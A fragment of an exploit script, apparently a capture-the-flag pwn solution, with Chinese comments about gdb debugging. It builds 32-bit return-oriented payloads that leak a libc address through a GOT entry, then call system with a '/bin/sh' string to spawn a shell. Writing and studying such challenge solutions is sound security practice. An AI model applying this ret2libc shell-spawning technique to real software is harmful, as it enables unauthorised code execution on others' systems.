...
# gdb调试得知
# 另外本题是因为看到了hint所以没深入想直接就栈偏移了，但其实溢出字节是够了，正常ret2libc就行
...
payload = p32(ret_addr) + p32(print_fun_plt) + p32(main_addr) + p32(search_fun_got)
payload = payload.ljust(0x24,b'a') + p32(hint_addr)
...
payload = p32(ret_addr) +p32(system_addr) + p32(main_addr) + p32(binsh_addr)
payload = payload.ljust(0x24,b'a') + p32(hint_addr)
io.sendlineafter(b'What\'s your name?',payload)
